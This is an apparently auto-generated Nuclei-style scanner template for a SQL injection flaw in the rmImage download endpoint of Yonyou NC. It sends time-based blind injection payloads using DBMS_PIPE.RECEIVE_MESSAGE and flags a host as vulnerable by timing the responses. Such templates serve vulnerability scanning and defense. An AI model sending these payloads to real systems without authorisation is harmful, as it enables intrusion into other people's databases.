id: poc-yaml-yongyou-nc-rmimage-sqli
info:
  name: "Yonyou NC rmImage 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Yonyou NC
  metadata:
    vendor: Yonyou NC

flow: http(1) && http(2)

http:
  - id: check-yonyou
    name: Check Yonyou NC presence
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Yonyou NC"

  - id: test-sqli
    name: Test for SQL Injection in rmImage
    method: GET
    path:
      - "{{BaseURL}}/portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--"
      - "{{BaseURL}}/portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',8)--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "image/png"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
